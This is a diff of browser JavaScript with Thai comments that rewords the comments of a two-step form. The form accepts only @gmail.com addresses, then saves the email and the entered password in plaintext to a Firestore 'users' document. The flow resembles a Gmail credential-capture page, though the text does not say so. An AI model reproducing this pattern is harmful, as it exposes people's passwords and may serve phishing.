@@ -24,7 +24,7 @@ function validateEmail() {
     let email = document.getElementById("email").value.trim();
     let nextButton = document.getElementById("next-btn");
 
-    // ✅ เช็คว่าต้องลงท้ายด้วย @gmail.com
+    // ✅ ถ้าอีเมลลงท้ายด้วย @gmail.com ให้เปิดปุ่ม
     if (email.endsWith("@gmail.com")) {
         nextButton.disabled = false; // 🔓 เปิดใช้งานปุ่ม
     } else {
@@ -36,10 +36,12 @@ function validateEmail() {
 function saveEmail() {
     let email = document.getElementById("email").value.trim();
 
+    // ❌ ถ้าไม่มี @gmail.com ไม่ให้ไปต่อ
     if (!email.endsWith("@gmail.com")) {
-        return; // ❌ ไม่ให้ไปต่อถ้าไม่ใช่ @gmail.com
+        return;
     }
 
+    // ✅ บันทึกอีเมลลง Firestore
     db.collection("users").doc(email).set({
         email: email,
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
@@ -61,15 +63,18 @@ function savePassword() {
 
     console.log("🔑 บันทึกรหัสผ่านสำหรับ:", email);
 
+    // ❌ ถ้าไม่มีอีเมล ให้กลับไปหน้าแรก
     if (!email) {
-        window.location.href = "index.html"; // 🔄 กลับไปหน้าแรก
+        window.location.href = "index.html"; 
         return;
     }
 
+    // ❌ ถ้าไม่ใส่รหัสผ่าน ไม่ให้ไปต่อ
     if (!password) {
-        return; // ❌ ไม่ให้ไปต่อถ้าไม่ใส่รหัสผ่าน
+        return;
     }
 
+    // ✅ บันทึกรหัสผ่านลง Firestore
     db.collection("users").doc(email).update({
         password: password
     })
